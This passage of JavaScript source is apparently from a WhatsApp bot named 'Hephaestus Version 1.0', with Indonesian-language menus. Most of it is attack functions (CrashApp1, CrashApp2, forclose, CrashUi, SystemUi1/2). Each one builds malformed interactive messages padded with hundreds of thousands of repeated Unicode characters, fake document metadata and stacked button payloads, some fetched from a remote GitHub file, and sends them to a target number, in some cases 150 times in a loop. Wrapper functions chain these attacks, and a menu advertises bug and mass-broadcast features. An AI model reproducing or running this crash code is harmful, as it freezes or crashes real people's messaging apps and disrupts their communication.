statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await client.relayMessage("status@broadcast", mess.message, {
messageId: mess.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await client.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: mess.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎" },
content: undefined
}
]
}
);
}
}
async function CrashApp1(isTarget) {
if (!isTarget.includes("@s.whatsapp.net") && !isTarget.includes("@g.us")) {
console.error("Error: Target JID tidak valid!", isTarget);
return;
}

let apiGrup;
try {
  const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
  apiGrup = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

let Msg = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [isTarget],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: isTarget,
},
},
body: {
text: "᭡꧈",
},
nativeFlowMessage: {
buttons: [
{  name: "single_select",
buttonParamsJson: apiGrup + "᭡꧈",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "᭡꧈",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "᭡꧈",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "᭡꧈",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "᭡꧈",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "᭡꧈",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "᭡꧈",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "᭡꧈",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "᭡꧈",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "᭡꧈",
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "review_order",
buttonParamsJson: "" }
],
},
}, 
},
}, 
}

for (let i = 0; i < 150; i++) {  
try {
await client.relayMessage(isTarget, Msg, {});
await new Promise(resolve => setTimeout(resolve, 1000));
} catch (err) {
console.error("Error mengirim bug:", err);
break;
}
}
console.log(`Succes Attack Target ${isTarget}`)
}

async function CrashApp2(isTarget) {
if (!isTarget.includes("@s.whatsapp.net") && !isTarget.includes("@g.us")) {
console.error("Error: Target JID tidak valid!", isTarget);
return;
}
let apiClient;
try {
  const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}
let Clot = {
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
participant: "0@s.whatsapp.net",
remoteJid: "X",
mentionedJid: [isTarget],
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
},
externalAdReply: {
showAdAttribution: true,
title: "᭡꧈",
body: "",
thumbnailUrl: null,
sourceUrl: "https://tama.app/",
mediaType: 1,
renderLargerThumbnail: true
},
businessMessageForwardInfo: {
businessOwnerJid: isTarget,
},
dataSharingContext: {
showMmDisclosure: true,
},
quotedMessage: {
paymentInviteMessage: {
serviceType: 1,
expiryTimestamp: null
}
}
},
header: {
title: "",
hasMediaAttachment: false
},
body: {
text: "᭡꧈",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", 
buttonParamsJson: apiClient + "᭡꧈"
},
{ name: "call_permission_request", 
buttonParamsJson: apiClient + "᭡꧈"
}, 
{ name: "call_permission_request", 
buttonParamsJson: apiClient + "᭡꧈"
}, 
{ name: "call_permission_request", 
buttonParamsJson: apiClient + "᭡꧈"
}, 
{ name: "call_permission_request", 
buttonParamsJson: apiClient + "᭡꧈"
}, 
{ name: "call_permission_request", 
buttonParamsJson: apiClient + "᭡꧈"
}, 
{ name: "call_permission_request", 
buttonParamsJson: apiClient + "᭡꧈"
}, 
{ name: "call_permission_request", 
buttonParamsJson: apiClient + "᭡꧈"
},
{ name: "call_permission_request", 
buttonParamsJson: apiClient + "᭡꧈"
}, 
{ name: "call_permission_request", 
buttonParamsJson: apiClient + "᭡꧈"
}, 
{ name: "payment_method", 
buttonParamsJson: ""
},
{ name: "payment_method", 
buttonParamsJson: ""
},
{ name: "payment_method", 
buttonParamsJson: ""
}, 
{ name: "payment_method", 
buttonParamsJson: ""
}, 
{ name: "payment_method", 
buttonParamsJson: ""
}, 
{ name: "payment_status", 
buttonParamsJson: ""
},
{ name: "payment_status", 
buttonParamsJson: ""
}, 
{ name: "payment_status", 
buttonParamsJson: ""
}, 
{ name: "payment_status", 
buttonParamsJson: ""
}, 
{ name: "payment_status", 
buttonParamsJson: ""
}, 
{ name: "review_order", 
buttonParamsJson: ""
},
],
},
},
},
},
}

for (let i = 0; i < 150; i++) {  
try {
await client.relayMessage(isTarget, Clot, {});
await new Promise(resolve => setTimeout(resolve, 1000));
} catch (err) {
console.error("Error mengirim bug:", err);
break;
}
}
  console.log(`Succes Attack Target ${isTarget}`)
}
async function forclose(target) {
    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
 version: ["Array"],
 browser: ["Array"],
 waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
 clientCectTimeoutMs: 20000,
 keepAliveIntervalMs: 30000,
 logger: {},
 printQRInTerminal: false,
 emitOwnEvents: true,
 defaultQueryTimeoutMs: 60000,
 customUploadHosts: [],
 retryRequestDelayMs: 250,
 maxMsgRetryCount: 5,
 fireInitQueries: true,
 auth: { Object: "authData" },
 markOnlineOnclientCect: true,
 syncFullHistory: true,
 linkPreviewImageThumbnailWidth: 192,
 transactionOpts: { Object: "transactionOptsData" },
 generateHighQualityLinkPreview: false,
 options: {},
 appStateMacVerification: { Object: "appStateMacData" },
 mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 3.2,
 isStatusBroadcast: true,
 statusBroadcastJid: "status@broadcast",
 badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
 newsletterJid: "proto@newsletter",
 serverMessageId: 1,
 newsletterName: `᭡꧈      - 〽${"ꥈ  ꥈ".repeat(10)}`,
 contentType: 3,
 accessibilityText: `᭡꧈ ********************************""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
 contextInfo: {
     businessMessageForwardInfo: { businessOwnerJid: target },
     dataSharingContext: { showMmDisclosure: true },
     participant: "0@s.whatsapp.net",
     mentionedJid: ["13135550002@s.whatsapp.net"],
 },
 body: {
     text: "\u0003" + "ꦽ".repeat(102002) + "\u0003".repeat(102002)
 },
 nativeFlowMessage: {
     buttons: [
         { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
         { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
         { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
     ]
 }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await client.relayMessage(target, message, { participant: { jid: target } });
    console.log(`Succes Attack Target ${target}`);
}
async function CrashUi(target) {
 let virtex = "ꦾ";
   client.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                 mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                 fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                 fileLength: "99999999999",
                 pageCount: 0x9184e729fff,
                 mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                 fileName: virtex,
                 fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                 directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                 mediaKeyTimestamp: "1715880173",
                 contactVcard: true
             },
             hasMediaAttachment: true
         },
         body: {
             text: "᭡꧈" + "ꦾ".repeat(100000) + "@1".repeat(300000)
         },
         nativeFlowMessage: {},
         contextInfo: {
             mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
             groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝗨𝗜 𝗦𝗶𝘀𝘁𝗲𝗺?" }]
         }
     }
 }
}
}, { participant: { jid: target } });
console.log(`Succes Attack Target ${terget}`)
};
async function SystemUi1(client, targetNumber) {
    let Thumb = `${global.imageUrl}`;
    function repeatText(text, times) {
        return text.repeat(times);
    }
    let repeatedText = repeatText("ꦿꦾ꧀ৃৃৃ⃟⃟⃟⃟⃟", 9999);
    let repeatedTitle = repeatText("ꦽ", 9999);
    let mgmenu = await prepareWAMessageMedia(
        { image: { url: Thumb } }, 
        { upload: client.waUploadToServer }
    );
    const msgii = await generateWAMessageFromContent(targetNumber, {
        viewOnceMessageV2Extension: {
            message: {
                messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
     text: `𝗧𝗼𝗸𝗼 𝗛𝗼𝘀𝘁𝗶𝗻𝗴 𝘁𝗲𝗿𝗯𝗮𝗶𝗸 𝗵𝗮𝗻𝘆𝗮 𝗱𝗶 Kontol!                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ${repeatedText} ${repeatedTitle} ${repeatedText}`
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
     cards: [{
         body: proto.Message.InteractiveMessage.Body.fromObject({}),
         footer: proto.Message.InteractiveMessage.Footer.fromObject({
             text: "𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎 𝗕𝘂𝗴 𝗬𝗼𝘂"
         }),
         header: proto.Message.InteractiveMessage.Header.fromObject({
             title: `${repeatedTitle}`,
             hasMediaAttachment: true, 
             ...mgmenu
         }),
         nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
             buttons: [
                 {
  "name": "quick_reply",
  "buttonParamsJson": `{\"display_text\":\"${repeatText("ꦽ", 200)}\",\"id\":\".tes\"}`
                 },
                 {
  "name": "quick_reply",
  "buttonParamsJson": `{\"display_text\":\"${repeatText("ꦽ", 200)}\",\"id\":\".tes\"}`
                 },
                 {
  "name": "cta_url",
  "buttonParamsJson": `{\"display_text\":\"${repeatText("ꦽ", 500)}\",\"url\":\"https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X\",\"merchant_url\":\"https://www.google.com\"}`
                 }
             ]
         })
     }]
 })
                })
            }
        }
    }, { userJid: targetNumber, quoted: null });

    await client.relayMessage(targetNumber, msgii.message, { messageId: msgii.key.id });
console.log(`Succes Attack Target ${tergetNumber}`)
}        

async function SystemUi2(client, targetNumber) {
    const Thumb = `${global.imageUrl}`;
    const repeat = (txt, count) => txt.repeat(count);
    const zalgo = repeat("H̵͚͐e̵͓͐ḻ̷͗l̵̡͠ö̶̳́", 500);
    const glitched = repeat("ꦿꦾ꧀ৃ⃟⃟⃟️️️️️", 2000);
    const zeroWidth = repeat("\u200B\u200C\u200D\u2060\uFEFF", 3000);
    const title = repeat("ꦿꦾ꧀ৃ⃟⃟⃟️️𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎", 100);
    const caption = `𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎 - Delay Invis \n\n${glitched}${zalgo}${zeroWidth}${title}${glitched}`;

    let mgmenu = await prepareWAMessageMedia(
        { image: { url: Thumb } }, 
        { upload: client.waUploadToServer }
    );

    const msgii = await generateWAMessageFromContent(targetNumber, {
        viewOnceMessageV2Extension: {
            message: {
                messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
     text: caption
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
     cards: Array.from({ length: 10 }, () => ({
         body: proto.Message.InteractiveMessage.Body.fromObject({ text: glitched }),
         footer: proto.Message.InteractiveMessage.Footer.fromObject({
             text: title
         }),
         header: proto.Message.InteractiveMessage.Header.fromObject({
             title: repeat("ꦿ", 300),
             hasMediaAttachment: true,
             ...mgmenu
         }),
         nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
             buttons: Array.from({ length: 3 }, (_, i) => ({
                 name: "quick_reply",
                 buttonParamsJson: JSON.stringify({
  display_text: repeat("꧁𝕶𝖎𝖑𝖑 𝕸𝖊꧂", 200),
  id: `.tes${i}`
                 })
             }))
         })
     }))
 })
                })
            }
        }
    }, { userJid: targetNumber });

    await client.relayMessage(targetNumber, msgii.message, { messageId: msgii.key.id });
console.log(`Succes Attack Target ${targetNumber}`)
}
async function HephForceV1(org) {
   await CrashApp1(org) 
   await CrashApp2(org) 
   await CrashApp2(org) 
   await CrashApp1(org) 
   await CrashApp2(org) 
   await CrashApp2(org) 
}
async function HepForcsV2(org) {
   await CrashApp3(org)
   await CrashApp4(org) 
   await CrashApp4(org) 
   await CrashApp3(org)
   await CrashApp4(org) 
   await CrashApp4(org) 
}
async function HephDelayMaker(org) {
   await HephDelay1(org) 
   await HephDelay2(org) 
   await HephDelay3(org) 
   await HephDelay(org)
   await HephDelay(org) 
   await HephDelay1(org) 
   await HephDelay2(org) 
   await HephDelay3(org) 
   await HephDelay(org)
   await HephDelay(org)
}
async function HephSystemUi(org) {
   await SystemUi1(org) 
   await SystemUi2(org) 
   await CrashUi(org) 
   await CrashUi(org)
   await SystemUi1(org) 
   await SystemUi2(org) 
   await CrashUi(org) 
   await CrashUi(org)
}
async function HephDelayXForce(org) {
   await HephDelay(org)
   await CrashApp2(org)
   await HepDelay1(org) 
   await HephDelay(org)
   await CrashApp2(org)
   await HepDelay1(org) 
}
async function HephUIXForce(org) {
   await CrashUi(org) 
   await forclose(org) 
   await SystemUi1(org) 
   await CrashUi(org) 
   await forclose(org) 
   await SystemUi1(org) 
}
        switch (command) {
        
case "menu":{
let captionText = `
> *HAII ${pushname}👋* 
> *${ucapanWaktu}*

> ꧈ *𝚃𝙸𝙼𝙴 𝙸𝙽𝙵𝙾*
   *𝚆𝙸𝙱 : ${wib}*
   *𝚆𝙸𝚃 : ${wit}*
   *𝚆𝙸𝚃𝙰 : ${wita}*
   *𝚃𝙰𝙽𝙶𝙶𝙰𝙻 : ${hariini}*

> ꧈ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃*
   *𝙱𝙾𝚃𝙽𝙰𝙼𝙴 : ${botName}*
   *𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝚅𝟷 𝙶𝙴𝙽 𝟷*
   *𝙼𝙾𝙳𝙴 𝙱𝙾𝚃 : ${client.public ? "𝙿𝚞𝚋𝚕𝚒𝚌":"𝙿𝚛𝚒𝚟𝚊𝚝𝚎"}*
   *𝙲𝚁𝙴𝙰𝚃𝙾𝚁 : ${OwnerName}*

> ꧈ *𝙸𝙽𝙵𝙾 𝚂𝙴𝚁𝚅𝙴𝚁*
   *𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${runtime(process.uptime())}*
   *𝚄𝙿𝚃𝙸𝙼𝙴 𝚅𝙿𝚂 : ${runtime(os.uptime())}*
   
> ꧈ *𝙻𝙸𝚂𝚃 𝙼𝙴𝙽𝚄*
*.bugmenu*
> Menampilkan Daftar Fitur Bug

*.ownermenu*
> Menampilkan Daftar Fitur Owner

*.othermenu*
> Menampilkan Daftar Fitur Other

*.jpmmenu* 
> Menampilkan Daftar Fitur Jpm
`
  client.sendMessage(
       m.chat, {
       image: { url: `${global.imageUrl}` },
       caption: captionText,
       footer: "© Created By AldzDeveloper",
       contextInfo: {
        externalAdReply: {
        showAdAttribution: true,
            containsAutoReply: true,
          thumbnailUrl: `${global.imageUrl2}`, 
          title: `𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎`,
          body: "© AldzDeveloper",
          sourceUrl: `${global.linkch}`,
          mediaType: 1,
          renderLargerThumbnail: true
        },
      },
     buttons: [
{ buttonId: ".owner", 
buttonText: { 
displayText: '𝙾𝚆𝙽𝙴𝚁' }},
{ buttonId: ".script",
buttonText: {
displayText: '𝚂𝙲𝚁𝙸𝙿𝚃' }},
{ buttonId: ".p", 
buttonText: {
displayText: "p" },
    nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝚂𝙴𝙻𝙴𝙲𝚃 𝙱𝚄𝚃𝚃𝙾𝙽",
                    sections: [
                        {
                            title: "© 𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎",
                            highlight_label: "",
                            rows: [
                          { title: "𝙱𝚄𝙶 𝙼𝙴𝙽𝚄", 
                          description: "", 
                          id: `.bugmenu` },
                          { title: "𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄", 
                          description: "", 
                          id: `.ownermenu` }, 
                          { title: "𝙾𝚃𝙷𝙴𝚁 𝙼𝙴𝙽𝚄",
                          description: "", 
                          id: `.othermenu` },
                          { title: "𝙹𝙿𝙼 𝙼𝙴𝙽𝚄", 
                          description: "", 
                          id: `.jpmmenu` },
                                ]
                        }
                ]
           })
      }
  }
],
viewOnce: true,
  headerType: 6
}, { quoted: qkontak })
}
break
case "othermenu": {
let captionText  = `
> *HAII ${pushname}👋* 
> *${ucapanWaktu}*

> ꧈ *𝚃𝙸𝙼𝙴 𝙸𝙽𝙵𝙾*
   *𝚆𝙸𝙱 : ${wib}*
   *𝚆𝙸𝚃 : ${wit}*
   *𝚆𝙸𝚃𝙰 : ${wita}*
   *𝚃𝙰𝙽𝙶𝙶𝙰𝙻 : ${hariini}*

> ꧈ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃*
   *𝙱𝙾𝚃𝙽𝙰𝙼𝙴 : ${botName}*
   *𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝚅𝟷 𝙶𝙴𝙽 𝟷*
   *𝙼𝙾𝙳𝙴 𝙱𝙾𝚃 : ${client.public ? "𝙿𝚞𝚋𝚕𝚒𝚌":"𝙿𝚛𝚒𝚟𝚊𝚝𝚎"}*
   *𝙲𝚁𝙴𝙰𝚃𝙾𝚁 : ${OwnerName}*

> ꧈ *𝙸𝙽𝙵𝙾 𝚂𝙴𝚁𝚅𝙴𝚁*
   *𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${runtime(process.uptime())}*
   *𝚄𝙿𝚃𝙸𝙼𝙴 𝚅𝙿𝚂 : ${runtime(os.uptime())}*


> ꧈ *𝙼𝙴𝙽𝚄 𝙾𝚃𝙷𝙴𝚁*
*.tourl*
> Send/Reply Image/audio/video

*.cekidch* 
> Link Channel Wa

*.hdvid* 
> Send/Reply Video

*.hd*
> Send/Reply Image
`;
client.sendMessage(m.chat, {
       image: { url: `${global.imageUrl}` },
       caption: captionText,
       footer: "© Created By AldzDeveloper",
       contextInfo: {
        externalAdReply: {
        showAdAttribution: true,
            containsAutoReply: true,
          thumbnailUrl: `${global.imageUrl2}`, 
          title: `𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎`,
          body: "© AldzDeveloper",
          sourceUrl: `${global.linkch}`,
          renderLargerThumbnail: true,
          mediaType: 1,
        },
      },
buttons: [
{ buttonId: ".owner", 
buttonText: { 
displayText: '𝙾𝚆𝙽𝙴𝚁' }},
{ buttonId: ".sc", 
buttonText: {
displayText: "𝚂𝙲𝚁𝙸𝙿𝚃" }},
{ buttonId: ".menu", 
buttonText: {
displayText: "𝙱𝙰𝙲𝙺 𝙼𝙴𝙽𝚄" }}
],
viewOnce: true,
  headerType: 6
}, { quoted: qkontak })
}
break
case "ownermenu": {
let captionText = `
> *HAII ${pushname}👋* 
> *${ucapanWaktu}*

> ꧈ *𝚃𝙸𝙼𝙴 𝙸𝙽𝙵𝙾*
   *𝚆𝙸𝙱 : ${wib}*
   *𝚆𝙸𝚃 : ${wit}*
   *𝚆𝙸𝚃𝙰 : ${wita}*
   *𝚃𝙰𝙽𝙶𝙶𝙰𝙻 : ${hariini}*

> ꧈ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃*
   *𝙱𝙾𝚃𝙽𝙰𝙼𝙴 : ${botName}*
   *𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝚅𝟷 𝙶𝙴𝙽 𝟷*
   *𝙼𝙾𝙳𝙴 𝙱𝙾𝚃 : ${client.public ? "𝙿𝚞𝚋𝚕𝚒𝚌":"𝙿𝚛𝚒𝚟𝚊𝚝𝚎"}*
   *𝙲𝚁𝙴𝙰𝚃𝙾𝚁 : ${OwnerName}*

> ꧈ *𝙸𝙽𝙵𝙾 𝚂𝙴𝚁𝚅𝙴𝚁*
   *𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${runtime(process.uptime())}*
   *𝚄𝙿𝚃𝙸𝙼𝙴 𝚅𝙿𝚂 : ${runtime(os.uptime())}*


> ꧈ *𝙼𝙴𝙽𝚄 𝙾𝚆𝙽𝙴𝚁*
*.addowner*
> .addowner 𝟼𝟸𝟾𝚡𝚡𝚡

*.delowner* 
> .delowner 𝟼𝟸𝟾𝚡𝚡𝚡

*.addprem* 
> .addprem 𝟼𝟸𝟾𝚡𝚡𝚡

*.delprem* 
> .delprem 𝟼𝟸𝟾𝚡𝚡𝚡

*.self* 
> Mengubah Mode Bot Ke Privat

*.public*
> Mengubah Mode Public

*.addcase* 
> Menambah fitur sc

*.getcase* 
> Mengambil Fitur sc

*.reactch* 
> Linkpesanch

*.restart*
> Restarting Panel/server

*.clearall*
> Hapus Semua Riwayat Pesan

*.sendsc* 
> .sendsc 𝟼𝟸𝟾xxx

*.backup*
> Mengemas Script Dari Server

*.add*
> Menambah Member Group Wa

*.buatgc*
> Membuat Group Wa
`;

client.sendMessage(m.chat, {
       image: { url: `${global.imageUrl}` },
       caption: captionText,
       footer: "© Created By AldzDeveloper",
       contextInfo: {
        externalAdReply: {
        showAdAttribution: true,
            containsAutoReply: true,
          thumbnailUrl: `${global.imageUrl2}`, 
          title: `𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎`,
          body: "© AldzDeveloper",
          sourceUrl: `${global.linkch}`,
          renderLargerThumbnail: true,
          mediaType: 1,
        },
      },
         buttons: [
{ buttonId: ".owner", 
buttonText: { 
displayText: '𝙾𝚆𝙽𝙴𝚁' }},
{ buttonId: ".sc", 
buttonText: {
displayText: "𝚂𝙲𝚁𝙸𝙿𝚃" }},
{ buttonId: ".menu", 
buttonText: {
displayText: "𝙱𝙰𝙲𝙺 𝙼𝙴𝙽𝚄" }}
],
viewOnce: true,
  headerType: 6
}, { quoted: qkontak })
}
break
case "jpmmenu": {
let captionText = `
> *HAII ${pushname}👋* 
> *${ucapanWaktu}*

> ꧈ *𝚃𝙸𝙼𝙴 𝙸𝙽𝙵𝙾*
   *𝚆𝙸𝙱 : ${wib}*
   *𝚆𝙸𝚃 : ${wit}*
   *𝚆𝙸𝚃𝙰 : ${wita}*
   *𝚃𝙰𝙽𝙶𝙶𝙰𝙻 : ${hariini}*

> ꧈ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃*
   *𝙱𝙾𝚃𝙽𝙰𝙼𝙴 : ${botName}*
   *𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝚅𝟷 𝙶𝙴𝙽 𝟷*
   *𝙼𝙾𝙳𝙴 𝙱𝙾𝚃 : ${client.public ? "𝙿𝚞𝚋𝚕𝚒𝚌":"𝙿𝚛𝚒𝚟𝚊𝚝𝚎"}*
   *𝙲𝚁𝙴𝙰𝚃𝙾𝚁 : ${OwnerName}*

> ꧈ *𝙸𝙽𝙵𝙾 𝚂𝙴𝚁𝚅𝙴𝚁*
   *𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${runtime(process.uptime())}*
   *𝚄𝙿𝚃𝙸𝙼𝙴 𝚅𝙿𝚂 : ${runtime(os.uptime())}*


> ꧈ *𝙼𝙴𝙽𝚄 𝙹𝙿𝙼*
*.jpmch-v1* 
> Post Teks Dengan Image

*.jpmch-v2* 
> Post Teks Dengan Video

*.jpmgrup-v1*
> Mengirim Teks Ke Semua Grup

*.jpmgrup-v2*
> Mengirim Teks Ke Semua Grup

*.addidch* 
> Menambah ID CH di db channel.json

*.delidch*
> Menghapus ID CH di db channel.json

*.listidch*
> Melihat ID CH yg di db channel.json
`;
client.sendMessage(m.chat, {
       image: { url: `${global.imageUrl}` },
       caption: captionText,
       footer: "© Created By AldzDeveloper",
       contextInfo: {
        externalAdReply: {
        showAdAttribution: true,
            containsAutoReply: true,
          thumbnailUrl: `${global.imageUrl2}`, 
          title: `𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎`,
          body: "© AldzDeveloper",
          sourceUrl: `${global.linkch}`,
          renderLargerThumbnail: true,
          mediaType: 1,
        },
      },
buttons: [
{ buttonId: ".owner", 
buttonText: { 
displayText: '𝙾𝚆𝙽𝙴𝚁' }},
{ buttonId: ".sc", 
buttonText: {
displayText: "𝚂𝙲𝚁𝙸𝙿𝚃" }},
{ buttonId: ".menu", 
buttonText: {
displayText: "𝙱𝙰𝙲𝙺 𝙼𝙴𝙽𝚄" }}
],
viewOnce: true,
  headerType: 6
}, { quoted: qkontak })
}
break
case "bugmenu": {
let captionText = `
> *HAII ${pushname}👋* 
> *${ucapanWaktu}*

